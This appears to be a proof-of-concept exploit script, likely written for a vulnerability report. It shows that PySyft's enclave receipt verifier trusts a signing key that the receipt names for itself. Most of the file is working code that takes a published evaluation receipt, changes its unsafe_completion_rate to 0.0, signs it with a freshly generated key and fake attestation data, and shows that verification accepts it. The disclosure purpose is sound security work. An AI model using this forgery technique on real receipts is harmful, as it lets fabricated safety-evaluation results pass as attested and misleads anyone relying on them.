#!/usr/bin/env python3
"""
`verify_receipt` accepts a receipt signed by any key the receipt itself names.

Target: PySyft dev (syft_enclaves.receipt), the signed DBE receipts that the
double-blind-eval notebook verifies and logs on Rekor.

`verify_receipt(envelope)` (receipt/dsse.py) takes the verification key from the
receipt's own `execution.attestation.keyBinding` document via `bound_key`
(receipt/key_binding.py), which only checks that `challenge.report_data` is the
sha256 of the label, nonce and the document's *own* sections. It does not:
  - check the hardware signature on the report (acknowledged in key_binding.py),
  - check any measurement / config digest against a release, or
  - compare the key with the `verified_key_bundle` from attestation, although
    packages/syft-enclave/tinfoil/CLAUDE.md states "`verify_receipt` checks the
    receipt against it" (the function takes only the envelope).

So anyone can take the maintainers' published example receipt
(notebooks/enclave/double-blind-eval-w-receipts/receipt.json), rewrite the
results (e.g. unsafe_completion_rate 0.6 -> 0.0), mint an ed25519 key, build a
self-consistent keyBinding listing it, sign, and verify_receipt returns the
forged receipt. No enclave, no TEE, no Tinfoil account.

Vendor code driven unmodified: syft_enclaves.receipt.verify_receipt,
syft_enclaves.receipt.dsse.sign_receipt.
"""

import base64
import copy
import hashlib
import json
import os
import sys

from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric.ed25519 import Ed25519PrivateKey

DEV = os.environ["PYSYFT"]  # PySyft checkout (for the published example receipt)
EXAMPLE = os.path.join(DEV, "notebooks", "enclave", "double-blind-eval-w-receipts", "receipt.json")

from syft_enclaves.receipt import verify_receipt
from syft_enclaves.receipt.dsse import sign_receipt
from syft_enclaves.receipt.key_binding import CRYPTO_MATERIAL_V1, KEY_SPKI_V1, REPORT_DATA_V1
from syft_enclaves.receipt.signing_key import ATTESTED_KEY_ID


def b64(obj) -> str:
    return base64.b64encode(json.dumps(obj).encode() if not isinstance(obj, bytes) else obj).decode()


def main() -> int:
    genuine = json.load(open(EXAMPLE))
    metric = lambda r, n: next(m for m in r["predicate"]["results"]["metrics"] if m["name"] == n)
    print("[published example] unsafe_completion_rate =",
          metric(genuine, "unsafe_completion_rate")["value"])

    forged = copy.deepcopy(genuine)
    metric(forged, "unsafe_completion_rate")["value"] = 0.0

    attacker = Ed25519PrivateKey.generate()
    spki = attacker.public_key().public_bytes(serialization.Encoding.DER,
                                              serialization.PublicFormat.SubjectPublicKeyInfo)
    kb = forged["predicate"]["execution"]["attestation"]["keyBinding"]
    kb["crypto_material"] = b64({"format": CRYPTO_MATERIAL_V1,
                                 "items": [{"id": ATTESTED_KEY_ID, "format": KEY_SPKI_V1,
                                            "data": spki.hex()}]})
    kb["device_evidence"] = b64(b"no hardware involved")
    nonce = os.urandom(32).hex()
    d = hashlib.sha256(REPORT_DATA_V1.encode())
    d.update(bytes.fromhex(nonce))
    for section in ("crypto_material", "device_evidence"):
        d.update(hashlib.sha256(base64.b64decode(kb[section])).digest())
    kb["challenge"] = {"report_data_algorithm": REPORT_DATA_V1, "nonce": nonce,
                       "report_data": (d.digest() + bytes(32)).hex()}

    envelope = sign_receipt(forged, attacker)
    receipt = verify_receipt(envelope)
    print("[verify_receipt] accepted forged receipt; unsafe_completion_rate =",
          metric(receipt, "unsafe_completion_rate")["value"])
    print("[forged]  configDigest/runtimeImage copied from the genuine run:",
          receipt["predicate"]["execution"]["configDigest"][:20] + "…")
    ok = metric(receipt, "unsafe_completion_rate")["value"] == 0.0
    print("RESULT:", "REPRODUCED: receipt with fabricated results verifies, signed by an arbitrary key"
          if ok else "not reproduced")
    return 0 if ok else 1


if __name__ == "__main__":
    sys.exit(main())
